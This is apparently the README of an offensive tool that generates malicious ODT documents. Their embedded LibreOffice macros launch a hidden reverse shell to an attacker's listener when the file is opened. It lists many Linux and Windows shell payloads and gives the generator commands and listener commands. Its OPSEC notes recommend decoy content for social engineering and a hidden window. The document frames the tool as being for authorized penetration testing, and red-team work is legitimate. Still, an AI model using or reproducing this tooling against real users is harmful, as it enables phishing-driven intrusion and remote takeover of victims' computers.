# ODT Reverse Shell Generator

**Author: Abdulrahman Mustafa**

Generates malicious ODT (OpenDocument Text) files with embedded LibreOffice Basic macros that execute a reverse shell on document open.

> **For authorized red team / penetration testing engagements only.**

## How It Works

The tool builds a valid ODT file (ZIP archive with ODF XML structure) containing:

- A **LibreOffice Basic macro** (`Standard.Module1.Main`) with the selected reverse shell payload
- A **`dom:load` event binding** that auto-executes the macro when the document is opened

The target must have LibreOffice installed with macro execution enabled (or accept the macro prompt).

## Usage

```
python3 odt-revshell-generator.py <IP> <PORT> [--os {linux,windows}] [--payload NAME] [-o OUTPUT]
python3 odt-revshell-generator.py --list [--os {linux,windows}]
```

### Arguments

| Argument | Description |
|----------|-------------|
| `IP` | Listener IP address for the callback |
| `PORT` | Listener port number (1-65535) |
| `--os` | Target OS: `linux` (default) or `windows` |
| `--payload, -p` | Payload type (see `--list` for all options) |
| `-o, --output` | Output filename (default: `revshell.odt`) |
| `--list, -l` | List all available payloads for the selected OS |

### Examples

```bash
# Linux — default bash /dev/tcp
python3 odt-revshell-generator.py 10.10.14.5 4444

# Linux — netcat mkfifo (no -e flag needed)
python3 odt-revshell-generator.py 10.10.14.5 4444 --payload nc-mkfifo

# Linux — Python3 reverse shell
python3 odt-revshell-generator.py 10.10.14.5 4444 -p python3

# Linux — Socat interactive PTY
python3 odt-revshell-generator.py 10.10.14.5 4444 -p socat

# Linux — OpenSSL encrypted shell
python3 odt-revshell-generator.py 10.10.14.5 4444 -p openssl

# Windows — default PowerShell (base64-encoded)
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows

# Windows — PowerShell with TLS encryption
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p powershell-tls

# Windows — nc.exe
python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows -p nc

# List all Linux payloads
python3 odt-revshell-generator.py --list

# List all Windows payloads
python3 odt-revshell-generator.py --list --os windows
```

## Available Payloads

### Linux (19 payloads)

| Payload | Requires | Description |
|---------|----------|-------------|
| `bash-tcp` | bash | Bash /dev/tcp reverse shell |
| `bash-udp` | bash | Bash /dev/udp reverse shell |
| `nc-e` | nc (traditional) | Netcat -e reverse shell |
| `nc-c` | nc (OpenBSD with -c) | Netcat -c reverse shell |
| `nc-mkfifo` | nc, mkfifo | Netcat mkfifo (no -e/-c) |
| `nc-mknod` | nc, mknod | Netcat mknod pipe method |
| `ncat` | ncat | Ncat (Nmap) reverse shell |
| `ncat-ssl` | ncat | Ncat with SSL encryption |
| `socat` | socat | Socat interactive PTY shell |
| `python` | python | Python 2 reverse shell |
| `python3` | python3 | Python 3 reverse shell |
| `perl` | perl | Perl reverse shell |
| `php` | php | PHP reverse shell (proc_open) |
| `ruby` | ruby | Ruby reverse shell |
| `node` | node | Node.js reverse shell |
| `telnet` | telnet, mkfifo | Telnet mkfifo reverse shell |
| `openssl` | openssl, mkfifo | OpenSSL encrypted reverse shell |
| `awk` | gawk | AWK /inet reverse shell |
| `lua` | lua, luasocket | Lua (luasocket) reverse shell |

### Windows (8 payloads)

| Payload | Requires | Description |
|---------|----------|-------------|
| `powershell` | powershell | PowerShell TCPClient (base64) |
| `powershell-trycatch` | powershell | PowerShell with error handling |
| `powershell-tls` | powershell | PowerShell TLS encrypted shell |
| `nc` | nc.exe on target | nc.exe -e cmd.exe |
| `python` | python, powershell | Python reverse shell via PowerShell |
| `perl` | perl, powershell | Perl reverse shell via PowerShell |
| `ruby` | ruby, powershell | Ruby reverse shell via PowerShell |
| `node` | node, powershell | Node.js reverse shell via PowerShell |

## Catching the Shell

```bash
# Standard listener
nc -lvnp 4444

# SSL listener (for ncat-ssl / powershell-tls)
ncat --ssl -lvnp 4444

# OpenSSL listener (for openssl payload)
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Socat listener (for socat payload — full interactive TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Requirements

- Python 3 (no external dependencies — stdlib only)
- Target must have LibreOffice with macro execution enabled

## OPSEC Notes

- The `meta:generator` tag is set to `LibreOffice` — modify `META_XML` in the script to customize
- Document body is an empty page — add decoy content for social engineering
- Macro is stored in `Basic/Standard/Module1.xml` inside the ODT ZIP
- Window style is set to `0` (hidden) for all payloads
- Complex payloads with quoting issues are automatically base64-encoded for reliable delivery

## Disclaimer

This tool is intended for authorized penetration testing, red team operations, and security certification labs (OSCP, CPTS, etc.) only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
